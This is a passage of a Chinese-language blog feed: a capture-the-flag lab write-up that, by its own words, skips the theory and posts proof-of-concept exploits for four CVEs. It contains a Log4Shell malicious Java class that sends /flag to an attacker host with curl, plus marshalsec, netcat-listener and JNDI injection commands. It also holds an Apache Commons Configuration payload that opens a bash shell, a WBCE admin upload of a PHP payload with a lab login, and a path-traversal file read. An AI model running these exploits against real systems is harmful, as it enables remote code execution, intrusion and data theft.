    <content type="html"><![CDATA[<h1 id="CVE系列"><a href="#CVE系列" class="headerlink" title="CVE系列"></a>CVE系列</h1><p>不详细讲原理，只发一下poc<br><span id="more"></span></p><h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><p>log4j<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;curl -X POST -F xx=@/flag  http://xx：8999&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先运行marshalsec<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://xx:8000/#Evil&quot; 1099</code></p><p>同时需要在8000端口起个web服务<br><code>python3 -m http.server 8000</code></p><p>要在8999端口起个nc，用于接受flag<br><code>nc -lvp 8999</code></p><p>输入框输入<br><code>$&#123;jndi:ldap://xx:1099/evil&#125;</code></p><p>不知道为什么不可以反弹shell，就直接用curl了</p><h2 id="CVE-2022-33980"><a href="#CVE-2022-33980" class="headerlink" title="CVE-2022-33980"></a>CVE-2022-33980</h2><p>payload<br><code>Url?url=http://xx:8000/test.xml&amp;data=path</code></p><p>test.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;xxx&#125;&quot;)&#125;<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>直接弹shell</p><blockquote><p><code>$&#123;url:utf-8:file:///&#125;</code>可以用于读取目录<br><code>$&#123;url:utf-8:file:///flag&#125;</code>可以用于读取文件</p></blockquote><h2 id="CVE-2022-25101"><a href="#CVE-2022-25101" class="headerlink" title="CVE-2022-25101"></a>CVE-2022-25101</h2><p><a href="http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/">http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/</a><br><code>admin123456</code><br>进入后台<br><img src="/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/1.png" alt><br>install处选择一个压缩包，其中要有info.php，info.php写入你的payload即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$archive</span> = <span class="keyword">new</span> <span class="title class_">PclZip</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract Add-on files into WBCE temp folder</span></span><br><span class="line"><span class="variable">$addon_root_path</span> = <span class="title function_ invoke__">find_addon_root_path</span>(<span class="variable">$archive</span>);</span><br><span class="line"><span class="variable">$list</span> = <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">extract</span>(</span><br><span class="line">    PCLZIP_OPT_PATH,</span><br><span class="line">    <span class="variable">$temp_unzip</span>,</span><br><span class="line">    PCLZIP_CB_PRE_EXTRACT,</span><br><span class="line">    <span class="string">&#x27;pclzip_extraction_filter&#x27;</span>,</span><br><span class="line">    PCLZIP_OPT_REPLACE_NEWER</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if uploaded file is a valid Add-On zip file</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$list</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>))) &#123;</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">print_error</span>(<span class="variable">$MESSAGE</span>[<span class="string">&#x27;GENERIC_INVALID_ADDON_FILE&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the templates info file</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$template_directory</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$theme_directory</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>);</span><br></pre></td></tr></table></figure><br>看看部分源码，可以看到他把压缩包的内容解压出来，然后require了info.php</p><h2 id="CVE-2021-44665"><a href="#CVE-2021-44665" class="headerlink" title="CVE-2021-44665"></a>CVE-2021-44665</h2><p>searchsploit相应的payload即可<br>把<br><code>../../database</code><br>改为<br><code>../../../../../../flag</code><br>即可<br>原理大概就是有一处insert的sql操作没有鉴权，可以用于添加相应的id，然后在getfile.php中可以获取到该id，绕过鉴权，并且他读取文件的操作没有过滤../，具体原理可以自行分析</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CVE系列&quot;&gt;&lt;a href=&quot;#CVE系列&quot; class=&quot;headerlink&quot; title=&quot;CVE系列&quot;&gt;&lt;/a&gt;CVE系列&lt;/h1&gt;&lt;p&gt;不详细讲原理，只发一下poc&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="cve" scheme="http://example.com/tags/cve/"/>
    
    <category term="靶场" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="sql" scheme="http://example.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>codeql</title>
    <link href="http://example.com/2023/08/06/codeql/"/>
    <id>http://example.com/2023/08/06/codeql/</id>
    <published>2023-08-06T08:49:35.000Z</published>
    <updated>2023-08-06T08:49:35.086Z</updated>
    
    
    
    
    
  </entry>
  
</feed>
